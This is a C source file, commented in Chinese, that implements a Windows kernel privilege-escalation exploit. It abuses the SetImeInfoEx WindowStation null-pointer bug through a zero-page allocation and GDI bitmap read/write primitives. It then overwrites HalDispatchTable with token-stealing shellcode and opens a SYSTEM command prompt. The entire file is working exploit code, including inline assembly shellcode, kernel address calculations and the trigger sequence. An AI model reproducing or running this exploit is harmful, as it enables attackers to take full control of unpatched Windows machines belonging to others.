
```
#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
#include<profileapi.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef NTSTATUS(WINAPI * NtQueryIntervalProfile_t)(
IN ULONG ProfileSource,
OUT PULONG Interval
);

typedef NTSTATUS
(WINAPI * My_NtAllocateVirtualMemory)(
IN HANDLE ProcessHandle,
IN OUT PVOID * BaseAddress,
IN ULONG ZeroBits,
IN OUT PULONG RegionSize,
IN ULONG AllocationType,
IN ULONG Protect
);
My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

//申请0页内存
void getZeroMemory() {
PVOID Zero_addr = (PVOID)1;
SIZE_T RegionSize = 0x1000;

*(FARPROC *)&NtAllocateVirtualMemory = GetProcAddress(
GetModuleHandleW(L"ntdll"),
"NtAllocateVirtualMemory");

if (NtAllocateVirtualMemory == NULL)
{
printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
system("pause");
}
if (!NT_SUCCESS(NtAllocateVirtualMemory(
INVALID_HANDLE_VALUE,
&Zero_addr,
0,
&RegionSize,
MEM_COMMIT | MEM_RESERVE,
PAGE_READWRITE)) || Zero_addr != NULL)
{
printf("[+]Failed to alloc zero page!\n");
system("pause");
}
printf("[+]Success to alloc zero page...\n");
}
__declspec(naked) VOID ShellCode()
{
_asm
{
pushad
mov eax, fs: [124h] //找到当前线程的_KTHREAD结构
mov eax, [eax + 0x50] //找到_EPROCESS结构
mov ecx, eax
mov edx, 4                //edx = system PID(4)
//循环是为了获取system的_EPROCESS
find_sys_pid :
mov eax, [eax + 0xb8] //找到进程活动链表
sub eax, 0xb8            //链表遍历
cmp [eax + 0xb4], edx //根据PID判断是否为SYSTEM
jnz find_sys_pid
//替换Token
mov edx, [eax + 0xf8]
mov[ecx + 0xf8], edx
popad
xor eax, eax
ret
}
}
static VOID CreateCmd()
{
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi = {0};
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_SHOW;
WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

//获取ntkrnlpa.exe 在 kernel mode 中的基地址
LPVOID NtkrnlpaBase()
{
LPVOID lpImageBase[1024];
DWORD lpcbNeeded;
CHAR lpfileName[1024];

EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

for (int i = 0; i < 1024; i++)
{
GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

if (!strcmp(lpfileName, "ntkrnlpa.exe"))
{
printf("[+]success to get %s\n", lpfileName);
return lpImageBase[i];
}
}
return NULL;
}

DWORD32 GetHalOffset_4()
{
//获取ntkrnlpa.exe运行时基址
PVOID pNtkrnlpaBase = NtkrnlpaBase();
printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

//获取用户态加载ntkrnlpa.exe的地址
HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");

//获取用户态中HalDispatchTable的地址
PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

//由ntkrnlpa.exe运行时基址加上HalDispatchTable偏移量，得到HalDispatchTable在内核空间中的地址，加上0x4偏移量
DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;
printf("[+]HalDispatchTable+0x4 is 0x%p\n", hal_4);
return (DWORD32)hal_4;
}

//NtUserSetImeInfoEx()系统服务函数未导出，需要自己在用户进程中调用该系统服务函数，以执行漏洞函数SetImeInfoEx()。
//其中SyscallIndex的计算，根据系统ShadowSSDT表导出序号计算。
DWORD gSyscall = 0x1226;
__declspec(naked) void NtUserSetImeInfoEx(PVOID tmp)
{
_asm
{
mov esi, tmp;
mov eax, gSyscall;
//系统调用符号
mov edx, 0x7FFE0300;
//ntdll.KiFastSystemCall快速系统调用
call dword ptr[edx];
ret 4;
}
}
DWORD getpeb()
{
//在NT内核中，FS段为TEB，TEB偏移0x30处为PEB
DWORD p = (DWORD)__readfsdword(0x18);
p = *(DWORD *)((char *)p + 0x30);
return p;
}
DWORD gTableOffset = 0x094;
DWORD getgdi()
{
return *(DWORD *)(getpeb() + gTableOffset);
}
DWORD gtable;
typedef struct
{
LPVOID pKernelAddress;
USHORT wProcessId;
USHORT wCount;
USHORT wUpper;
USHORT wType;
LPVOID pUserAddress;
} GDICELL;
PVOID getpvscan0(HANDLE h)
{
if (!gtable)
gtable = getgdi();
DWORD p = (gtable + LOWORD(h) * sizeof(GDICELL)) & 0x00000000ffffffff;
GDICELL * c = (GDICELL *)p;
return (char *)c->pKernelAddress + 0x30;

}

int main()
{
//1. 创建bitmap对象
unsigned int bbuf[0x60] = {0x90};
HANDLE gManger = CreateBitmap(0x60, 1, 1, 32, bbuf);
HANDLE gWorker = CreateBitmap(0x60, 1, 1, 32, bbuf);
//2. 使用句柄查找GDICELL，计算pvScan0地址
PVOID mpv = getpvscan0(gManger);
PVOID wpv = getpvscan0(gWorker);
printf("[+] Get manager at 0x%p,worker at 0x%p\n", mpv, wpv);
//使用漏洞将Worker的pvScan0偏移地址写入Manager的pvScan0值
//新建一个新的窗口,新建的WindowStation对象其偏移0x14位置的spklList字段的值默认是零
HWINSTA hSta = CreateWindowStation(
0, //LPCSTR lpwinsta
0, //DWORD dwFlags
READ_CONTROL, //ACCESS_MASK dwDesiredAccess
0               //LPSECURITY_ATTRIBUTES lpsa
);

//和窗口当前进程关联起来
SetProcessWindowStation(hSta);

char buf[0x200];
RtlSecureZeroMemory(&buf, 0x200);
PVOID * p = (PVOID *)&buf;
p[0] = (PVOID)wpv;
DWORD * pp = (DWORD *)&p[1];
pp[0] = 0x180;
pp[1] = 0x1d95;
pp[2] = 6;
pp[3] = 0x10000;
pp[5] = 0x4800200;
//获取0页内存
getZeroMemory();
*(DWORD *)(0x2C) = (DWORD)(mpv);
*(DWORD *)(0x14) = (DWORD)(wpv);
//WindowStation->spklList字段为0，函数继续执行将触发漏洞
NtUserSetImeInfoEx((PVOID)&buf);
PVOID pOrg = 0;
DWORD haladdr = GetHalOffset_4();
PVOID oaddr = (PVOID)haladdr;
PVOID sc = &ShellCode;

SetBitmapBits((HBITMAP)gManger, sizeof(PVOID), &oaddr);
//利用manager设置worker的可修改地址为hal函数
printf("[+]要覆盖的目标地址 0x%x\n", oaddr);
GetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);//获取可修改的地址
SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &sc);//设置地址为shellcode
printf("[+]覆盖完毕，准备执行Shellcode");

//触发shellcode
NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"),
"NtQueryIntervalProfile");
printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);
DWORD interVal = 0;
NtQueryIntervalProfile(0x1337, &interVal);
//收尾
SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);
CreateCmd();
return 0;
}
```
